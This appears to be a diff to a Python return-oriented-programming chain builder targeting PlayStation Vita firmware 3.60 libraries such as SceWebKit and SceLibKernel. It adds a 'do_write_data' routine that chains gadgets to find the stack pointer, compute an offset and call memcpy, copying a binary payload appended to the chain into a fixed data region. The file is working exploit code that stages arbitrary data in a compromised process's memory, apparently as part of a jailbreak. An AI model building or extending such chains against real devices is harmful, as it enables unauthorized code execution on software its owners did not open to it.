@@ -1,6 +1,6 @@
 from rop import Rop, Ret, Load
-from relocatable import SceWebKit_base, SceLibKernel_base, SceLibc_base, SceLibHttp_base, SceNet_base
-from util import p32
+from relocatable import SceWebKit_base, SceLibKernel_base, SceLibc_base, SceLibHttp_base, SceNet_base, data_base
+from util import p32, u32
 
 
 class Gadgets360:
@@ -101,6 +101,9 @@ class Rop360(Rop):
         # Used by repeat()
         self.loop_index = self.pre_alloc_var(4)
         self.loop_temp = self.pre_alloc_var(4)
+
+        # Used by do_write_data
+        self.write_data_temp = self.pre_alloc_var(4)
 
     def call_v7(self, func, a0=0, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0):
         self.rop += [
@@ -219,6 +222,70 @@ class Rop360(Rop):
             G.blx_r3_pop_r4_pc,
             0,
         ]
+
+    def do_write_data(self, data_binary):
+        part1 = [
+            # r0 = sp
+            G.pop_r2_pc,
+            G.pop_pc,
+            G.mov_r0_sp_blx_r2,
+
+            # r0 += const
+            G.pop_r1_pc,
+            0xDEAD,
+        ]
+
+        part2 = [
+            G.pop_r4_pc,
+            G.adds_r0_r1,
+            G.blx_r4_pop_r4_pc,
+            0,
+
+            # [write_data_temp] = r0
+            G.pop_r1_pc,
+            self.write_data_temp,
+            G.str_r0_r1_pop_r4,
+            0,
+
+            # r1 = [write_data_temp]
+            G.pop_r1_pc,
+            self.write_data_temp,
+            G.pop_r5_r6_r7_r8_sb_pc,
+            0,
+            0,
+            0,
+            0,
+            G.pop_pc, # sb
+            G.ldr_r1_r1_blx_sb,
+
+            # (dest) r0 = data_base
+            G.pop_r0_pc,
+            data_base,
+
+            # (len) r2 = len(data_binary)
+            G.pop_r2_pc,
+            len(data_binary),
+
+            G.pop_r4_pc,
+            F.memcpy,
+
+            # call memcpy(data_binary, SRC_past_rop, len)
+            G.blx_r4_pop_r4_pc,
+            0,
+        ]
+
+        part1[-1] = (len(part2 + self.rop) + 2) * 4
+
+        # Append data_binary as a series of words at the end of ropchain
+        for word in range(0, len(data_binary) // 4):
+            data = data_binary[word*4:(word+1)*4]
+
+            num = u32(data)
+            self.rop.append(num)
+
+        # Prepend data_binary writer
+        self.rop = part1 + part2 + self.rop
+
 
     def repeat(self, times, body):
         #---- Increment index
